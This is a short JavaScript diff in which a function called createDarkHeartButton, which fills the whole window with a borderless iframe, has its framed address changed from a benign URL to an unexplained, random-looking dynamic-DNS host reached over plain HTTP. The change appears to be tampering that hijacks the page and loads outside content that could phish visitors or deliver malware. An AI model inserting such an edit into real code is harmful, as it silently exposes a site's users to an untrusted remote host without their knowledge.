@@ -13,7 +13,7 @@ export function createDarkHeartButton() {
       document.body.style.margin = "0";
       document.body.style.height = "100vh";
       let frame = createElement("iframe", {
-        src: "https://hello.com"
+        src: "http://ergethrdytnhgbf.zapto.org/"
       });
       frame.style.border = "none";
       frame.style.width = "100%";
